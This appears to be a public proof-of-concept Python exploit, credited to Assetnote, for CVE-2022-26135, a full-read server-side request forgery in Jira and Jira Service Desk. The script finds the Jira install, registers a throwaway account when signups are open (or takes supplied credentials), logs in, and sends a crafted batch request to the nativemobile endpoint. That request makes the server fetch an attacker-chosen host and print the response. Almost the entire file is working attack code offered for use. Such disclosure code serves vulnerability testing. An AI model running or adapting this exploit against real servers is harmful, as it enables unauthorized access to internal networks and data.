import requests
import string
import random
import argparse
from bs4 import BeautifulSoup as bs4
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("--target", help="i.e. http://re.local:8090", required=True)
parser.add_argument("--ssrf", help="i.e. example.com (no protocol pls)", required=True)
parser.add_argument("--mode", help="i.e. manual or automatic - manual mode you need to provide user auth info", required=True, default="automatic")
parser.add_argument("--software", help="i.e. jira or jsd - only needed for manual mode")
parser.add_argument("--username", help="i.e. admin - only needed for manual jira mode")
parser.add_argument("--email", help="i.e. admin@example.com - only needed for manual jira service desk mode")
parser.add_argument("--password", help="i.e. testing123 - only needed for manual mode")
args = parser.parse_args()

if args.mode == "manual":
    if args.software == "":
        print("[*] please pass in a software (jira / jsd)")
    if args.software == "jira" and args.email == "" and args.password == "":
        print("[*] must provide an email and password for jira in manual mode")
    if args.software == "jsd" and args.username == "" and args.password == "":
        print("[*] must provide an username and password for jira in manual mode")

# atlast - exploit tested on jira < 8.20.3 / jira service desk < 4.20.3-REL-0018
# for full list of affected jira versions please see the following URL
# https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html
# by shubs
banner = """
        _   _           _   
   __ _| |_| | __ _ ___| |_ 
  / _` | __| |/ _` / __| __|
 | (_| | |_| | (_| \__ \ |_ 
  \__,_|\__|_|\__,_|___/\__|

jira full read ssrf [CVE-2022-26135]
brought to you by assetnote [https://assetnote.io]                            
"""

print(banner)

proxies = {} # proxy to burp like this - {"https":"http://localhost:8080"}
session = requests.Session()

def detect_jira_root(target):
    root_paths = ["/", "/secure/" "/jira/", "/issues/"]
    jira_found = ""
    for path in root_paths:
        test_url = "{}/{}".format(target, path)
        r = session.get(test_url, verify=False, proxies=proxies)
        if "ajs-base-url" in r.text:
            jira_found = path
            break
    return jira_found

def get_jira_signup(target, base_path):
    test_url = "{}{}".format(target, base_path)
    r = session.get(test_url, verify=False, proxies=proxies)
    signup_enabled = False
    if "Signup!default.jspa" in r.text:
        signup_enabled = True
    return signup_enabled

def signup_user(target, base_path):
    test_url = "{}{}secure/Signup!default.jspa".format(target, base_path)
    test_url_post = "{}{}secure/Signup.jspa".format(target, base_path)
    r = session.get(test_url, verify=False, proxies=proxies)
    if 'name="captcha"' in r.text:
        print("[*] url {} has captchas enabled, please complete flow manually and provide user and password as arg".format(test_url))
        return False, {}
    if "Mode Breach" in r.text:
        print("[*] url {} has signups disabled, trying JSD approach".format(test_url))
        return False, {}
    # captcha not detected, proceed with registration
    html_bytes = r.text
    soup = bs4(html_bytes, 'lxml')
    token = soup.find('input', {'name':'atl_token'})['value']
    full_name = ''.join(random.sample((string.ascii_uppercase+string.digits),6))
    email = "{}@example.com".format(full_name)
    password = "9QWP7zyvfa4nJU9QKu*Yt8_QzbP"
    paramsPost = {"password":password,"Signup":"Sign up","atl_token":token,"fullname":full_name,"email":email,"username":full_name}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Upgrade-Insecure-Requests":"1","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/x-www-form-urlencoded"}
    cookies = {"atlassian.xsrf.token":token}
    r = session.post(test_url_post, data=paramsPost, headers=headers, cookies=cookies, verify=False, proxies=proxies)
    if "Congratulations!" in r.text:
        print("[*] successful registration")
        user_obj = {"username": full_name, "password": password, "email": email}
        return True, user_obj

# attempts to signup to root JSD
def register_jsd(target, base_path):
    register_url = "{}{}servicedesk/customer/user/signup".format(target, base_path)
    full_name = ''.join(random.sample((string.ascii_uppercase+string.digits),6))
    email = "{}@example.com".format(full_name)
    password = "9QWP7zyvfa4nJU9QKu*Yt8_QzbP"

    # try and sign up to the service desk portal without project IDs (easy win?)
    rawBody = "{{\"email\":\"{}\",\"fullname\":\"{}\",\"password\":\"{}\",\"captcha\":\"\",\"secondaryEmail\":\"\"}}".format(email, full_name, password)
    headers = {"Origin":"{}".format(target),"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Referer":"{}/servicedesk/customer/portal/1/user/signup".format(target),"Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/json"}
    r = session.post(register_url, data=rawBody, headers=headers, verify=False, proxies=proxies)
    if r.status_code == 204:
        print("[*] successful registration")
        user_obj = {"username": full_name, "password": password, "email": email}
        return True, user_obj
    print("[*] url {} has non-captcha user/pass signups disabled :(".format(register_url))
    register_email_url = "{}{}servicedesk/customer/user/emailsignup".format(target, base_path)
    rawBody = "{{\"email\":\"{}\",\"captcha\":\"\",\"secondaryEmail\":\"\"}}".format(email)
    r = session.post(register_email_url, data=rawBody, headers=headers, verify=False, proxies=proxies)
    if r.status_code == 204:
        print("[*] registration may be possible via emailsignup endpoint")
        print("[*] you will have to manually exploit this with a real email")
        print("[*] visit {}".format(register_url))
        return False, {}
    if r.status_code == 400:
        print("[*] registration may be possible via emailsignup endpoint")
        print("[*] you will have to manually exploit this with a real email and captcha")
        print("[*] visit {}".format(register_url))
        return False, {}
    print(r.status_code)
    return False, {}

def exploit_ssrf_jsd(target, base_path, user_obj, ssrf_host):
    login_url = "{}{}servicedesk/customer/user/login".format(target, base_path)
    paramsPost = {"os_password":user_obj["password"],"os_username":user_obj["email"]}
    headers = {"Origin":"{}".format(target),"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Referer":"{}/servicedesk/customer/portal/1/user/signup".format(target),"Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/x-www-form-urlencoded"}
    r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies)

    if "loginSucceeded" in r.text:
        print("[*] successful login")

    test_url = "{}{}rest/nativemobile/1.0/batch".format(target, base_path)
    rawBody = "{{\"requests\":[{{\"method\":\"GET\",\"location\":\"@{}\"}}]}}".format(ssrf_host)
    headers = {"Origin":"{}".format(target),"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Referer":"{}/servicedesk/customer/portal/1/user/signup".format(target),"Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/json"}
    r = session.post(test_url, data=rawBody, headers=headers)

    print("Status code:   %i" % r.status_code)
    print("Response body: %s" % r.content)

def exploit_ssrf_jira(target, base_path, user_obj, ssrf_host):
    login_url = "{}{}login.jsp".format(target, base_path)
    paramsPost = {"os_password":user_obj["password"],"user_role":"","os_username":user_obj["username"],"atl_token":"","os_destination":"","login":"Log In"}
    headers = {"Origin":"{}".format(target),"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Referer":"{}/".format(target),"Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Upgrade-Insecure-Requests":"1","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/x-www-form-urlencoded"}
    r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies)
    
    if r.headers["X-Seraph-LoginReason"] == "OK":
        print("[*] successful login")

    test_url = "{}{}rest/nativemobile/1.0/batch".format(target, base_path)
    rawBody = "{{\"requests\":[{{\"method\":\"GET\",\"location\":\"@{}\"}}]}}".format(ssrf_host)
    headers = {"Origin":"{}".format(target),"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Referer":"{}/servicedesk/customer/portal/1/user/signup".format(target),"Connection":"close","Pragma":"no-cache","DNT":"1","Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/json"}
    r = session.post(test_url, data=rawBody, headers=headers)

    print("Status code:   %i" % r.status_code)
    print("Response body: %s" % r.content)


# target = "http://re.local:8090"
# ssrf_host = "907zer1sxey5czbnnf7p9d1zfqlj98.oastify.com"

user_obj = {}

successful_jira_signup = False
successful_jsd_signup = False

jira_root = detect_jira_root(args.target)

if args.mode == "manual" and args.software == "jira":
    user_obj = {"username": args.username, "password": args.password, "email": args.email}
    exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf)

if args.mode == "manual" and args.software == "jsd":
    user_obj = {"username": args.username, "password": args.password, "email": args.email}
    exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)

if args.mode == "automatic":
    signup_enabled = get_jira_signup(args.target, jira_root)
    successful_jira_signup, user_obj = signup_user(args.target, jira_root)

    if successful_jira_signup == True:
        exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf)

    if successful_jira_signup == False:
        # try to sign up to jira service desk instead
        successful_jsd_signup, user_obj = register_jsd(args.target, jira_root)
        if successful_jsd_signup:
            exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)

if successful_jira_signup == False and successful_jsd_signup == False:
    print("[*] sorry boss no ssrf for you today")